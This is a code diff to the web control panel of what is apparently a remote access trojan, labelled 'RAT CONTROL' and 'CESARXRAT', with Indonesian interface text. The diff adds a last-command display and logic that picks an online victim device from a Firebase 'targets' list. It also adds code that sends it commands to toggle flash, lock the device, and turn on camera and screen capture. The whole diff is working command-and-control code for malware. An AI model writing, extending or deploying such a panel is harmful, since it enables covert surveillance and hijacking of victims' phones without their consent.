@@ -122,6 +122,17 @@
         .switch-lg input:checked + .slider:before {
             transform: translateX(22px); background: #fff;
         }
+        .switch-lg input:disabled + .slider {
+            opacity: 0.4; cursor: not-allowed;
+        }
+        .last-command {
+            background: #111a3a; border-radius: 14px;
+            padding: 12px 16px; margin-top: 16px;
+            border: 1px solid #2a4a8a;
+            font-size: 13px; color: #8899dd;
+            display: flex; justify-content: space-between;
+        }
+        .last-command .val { color: #4ae0a0; font-weight: bold; }
         .btn-back {
             background: transparent; border: 2px solid #4a9eff;
             color: #4a9eff; padding: 12px 24px;
@@ -138,18 +149,18 @@
     <div class="rat-container">
         <div class="rat-header">
             <h1>RAT CONTROL</h1>
-            <span class="status-badge" id="statusBadge">
-                <span class="dot"></span> <span id="statusText">ONLINE</span>
+            <span class="status-badge offline" id="statusBadge">
+                <span class="dot"></span> <span id="statusText">MEMUAT...</span>
             </span>
         </div>
 
-        <div class="device-info" id="deviceInfo">
+        <div class="device-info">
             <div class="icon">📱</div>
-            <div class="detail" id="deviceDetail">
-                <div class="name" id="deviceName">Menunggu koneksi...</div>
+            <div class="detail">
+                <div class="name" id="deviceName">Memuat...</div>
                 <div class="os" id="deviceOs">- - -</div>
                 <div class="tweak" id="deviceTweak" style="display:none;">Tweak: -</div>
-                <div class="waiting" id="deviceWaiting">Belum ada perangkat target yang terhubung</div>
+                <div class="waiting" id="deviceWaiting" style="display:none;">Belum ada perangkat target yang terhubung</div>
             </div>
         </div>
 
@@ -190,57 +201,136 @@
             </div>
         </div>
 
+        <div class="last-command">
+            <span>📤 Perintah terakhir:</span>
+            <span class="val" id="lastCommand">-</span>
+        </div>
+
         <button class="btn-back" onclick="history.back()">Kembali</button>
     </div>
 
     <script type="module">
-        import { db, ref, onValue } from './firebase-config.js';
+        import { db, ref, onValue, set, get, child } from './firebase-config.js';
 
-        const targetRef = ref(db, 'targets/active');
-        onValue(targetRef, (snapshot) => {
-            const target = snapshot.val();
-            const statusBadge = document.getElementById('statusBadge');
-            const statusText = document.getElementById('statusText');
-            const deviceName = document.getElementById('deviceName');
-            const deviceOs = document.getElementById('deviceOs');
-            const deviceTweak = document.getElementById('deviceTweak');
-            const deviceWaiting = document.getElementById('deviceWaiting');
+        // ===== AMBIL TARGET ID =====
+        const urlParams = new URLSearchParams(window.location.search);
+        let targetId = urlParams.get('target');
 
-            if (target) {
-                statusBadge.classList.remove('offline');
-                statusText.textContent = 'ONLINE';
-                deviceName.textContent = target.name || 'Perangkat Target';
-                deviceOs.textContent = target.os || '- - -';
-                
-                if (target.tweak) {
-                    deviceTweak.style.display = 'inline-block';
-                    deviceTweak.textContent = 'Tweak: ' + target.tweak;
-                } else {
-                    deviceTweak.style.display = 'none';
+        let targetRef = null;
+        let currentTargetOnline = false;
+
+        // ===== KALAU TIDAK ADA PARAMETER, AMBIL TARGET PERTAMA YANG ONLINE =====
+        async function getFirstOnlineTarget() {
+            const snapshot = await get(child(ref(db), 'targets'));
+            if (snapshot.exists()) {
+                const data = snapshot.val();
+                for (const key in data) {
+                    const target = data[key];
+                    if (target && target.status === 'online') {
+                        return key;
+                    }
                 }
-                deviceWaiting.style.display = 'none';
-
-                document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
-                    cb.disabled = false;
-                });
-            } else {
-                statusBadge.classList.add('offline');
-                statusText.textContent = 'OFFLINE';
-                deviceName.textContent = 'Menunggu koneksi...';
-                deviceOs.textContent = '- - -';
-                deviceTweak.style.display = 'none';
-                deviceWaiting.style.display = 'block';
-
-                document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
-                    cb.disabled = true;
-                    cb.checked = false;
-                });
-                document.querySelectorAll('.control-box .label span').forEach(el => {
-                    el.textContent = 'OFF';
-                    el.className = '';
-                });
             }
-        });
+            return null;
+        }
+
+        // ===== INIT =====
+        async function init() {
+            if (!targetId) {
+                console.log('[RAT] Tidak ada parameter target, ambil target online pertama...');
+                targetId = await getFirstOnlineTarget();
+            }
+
+            if (!targetId) {
+                document.getElementById('statusText').textContent = 'NO TARGET';
+                document.getElementById('deviceName').textContent = 'Tidak ada target';
+                document.getElementById('deviceWaiting').style.display = 'block';
+                console.log('[RAT] Tidak ada target yang tersedia');
+                return;
+            }
+
+            console.log('[RAT] Menggunakan target ID:', targetId);
+            targetRef = ref(db, 'targets/' + targetId);
+            listenTarget();
+        }
+
+        function listenTarget() {
+            onValue(targetRef, (snapshot) => {
+                const target = snapshot.val();
+                const statusBadge = document.getElementById('statusBadge');
+                const statusText = document.getElementById('statusText');
+                const deviceName = document.getElementById('deviceName');
+                const deviceOs = document.getElementById('deviceOs');
+                const deviceTweak = document.getElementById('deviceTweak');
+                const deviceWaiting = document.getElementById('deviceWaiting');
+
+                if (target) {
+                    // Cek timestamp (30 detik)
+                    const now = Date.now();
+                    const diff = target.timestamp ? (now - target.timestamp) : 999999;
+                    const isOnline = diff < 30000 && target.status === 'online';
+                    currentTargetOnline = isOnline;
+
+                    if (isOnline) {
+                        statusBadge.classList.remove('offline');
+                        statusText.textContent = 'ONLINE';
+                    } else {
+                        statusBadge.classList.add('offline');
+                        statusText.textContent = 'OFFLINE';
+                    }
+
+                    deviceName.textContent = target.name || 'Perangkat Target';
+                    deviceOs.textContent = target.os || '- - -';
+
+                    if (target.tweak) {
+                        deviceTweak.style.display = 'inline-block';
+                        deviceTweak.textContent = 'Tweak: ' + target.tweak;
+                    } else {
+                        deviceTweak.style.display = 'none';
+                    }
+                    deviceWaiting.style.display = 'none';
+
+                    // Enable/disable switches
+                    document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
+                        cb.disabled = !isOnline;
+                    });
+
+                    if (!isOnline) {
+                        document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
+                            cb.checked = false;
+                        });
+                        document.querySelectorAll('.control-box .label span').forEach(el => {
+                            el.textContent = 'OFF';
+                            el.className = '';
+                        });
+                    }
+                } else {
+                    currentTargetOnline = false;
+                    statusBadge.classList.add('offline');
+                    statusText.textContent = 'OFFLINE';
+                    deviceName.textContent = 'Target tidak ditemukan';
+                    deviceOs.textContent = '- - -';
+                    deviceTweak.style.display = 'none';
+                    deviceWaiting.style.display = 'block';
+                    deviceWaiting.textContent = 'Target dengan ID ' + targetId + ' tidak ada di Firebase.';
+
+                    document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
+                        cb.disabled = true;
+                    });
+                }
+            });
+        }
+
+        // ===== KIRIM PERINTAH =====
+        function sendCommand(command) {
+            if (!currentTargetOnline) {
+                alert('Target offline! Tunggu sampai online.');
+                return;
+            }
+            set(ref(db, 'targets/' + targetId + '/command'), command);
+            document.getElementById('lastCommand').textContent = command;
+            console.log('[RAT] Command sent:', command);
+        }
 
         function updateStatus(checkboxId, statusId) {
             const checkbox = document.getElementById(checkboxId);
@@ -255,19 +345,24 @@
         }
 
         const controls = [
-            { checkbox: 'flash', status: 'flashStatus' },
-            { checkbox: 'lock', status: 'lockStatus' },
-            { checkbox: 'camera', status: 'cameraStatus' },
-            { checkbox: 'screen', status: 'screenStatus' }
+            { checkbox: 'flash', status: 'flashStatus', command: 'FLASH' },
+            { checkbox: 'lock', status: 'lockStatus', command: 'LOCK' },
+            { checkbox: 'camera', status: 'cameraStatus', command: 'CAMERA' },
+            { checkbox: 'screen', status: 'screenStatus', command: 'SCREEN' }
         ];
 
         controls.forEach(function(item) {
-            const cb = document.getElementById(item.checkbox);
-            cb.addEventListener('change', function() {
+            const checkboxEl = document.getElementById(item.checkbox);
+            checkboxEl.addEventListener('change', function() {
+                const cmd = item.command + (this.checked ? '_ON' : '_OFF');
+                sendCommand(cmd);
                 updateStatus(item.checkbox, item.status);
             });
             updateStatus(item.checkbox, item.status);
         });
+
+        // ===== JALANKAN =====
+        init();
 
         console.log('[CESARXRAT] RAT Control real-time aktif');
     </script>
